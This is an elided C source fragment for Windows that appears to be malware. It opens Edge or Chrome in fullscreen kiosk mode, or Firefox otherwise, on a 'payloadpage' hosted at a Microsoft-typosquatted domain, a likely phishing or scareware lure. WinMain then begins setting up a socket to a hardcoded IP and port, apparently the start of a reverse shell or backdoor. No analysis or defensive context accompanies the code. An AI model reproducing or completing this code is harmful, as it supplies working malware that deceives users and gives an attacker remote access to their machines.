...
void open_link_multibrowser() {
    //Microsoft Egde
    if (file_exists("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe") ||
        file_exists("C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe")) {

        ShellExecute(
            NULL,
            "open",
            "msedge.exe",
            "--kiosk https://microsott.netlify.app/payloadpage.html --edge-kiosk-type=fullscreen",
            NULL,
            SW_SHOWNORMAL
        );
        return;
    ...
    if (file_exists("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe") ||
        ...
        ShellExecute(
            ...
            "open",
            "chrome.exe",
            "--kiosk https://microsott.netlify.app/payloadpage.html",
            NULL,
            SW_SHOWNORMAL
        );
        return;
    ...
    // Firefox
    if (file_exists("C:\\Program Files\\Mozilla Firefox\\firefox.exe") ||
        file_exists("C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe")) {
    ...
    ShellExecute(
        NULL,
        "open",
        "https://microsott.netlify.app/payloadpage.html",
        NULL,
        NULL,
        SW_SHOWNORMAL
    );
...
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
    open_link_multibrowser();
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "192.168.126.128";
	ServPort = 50005;
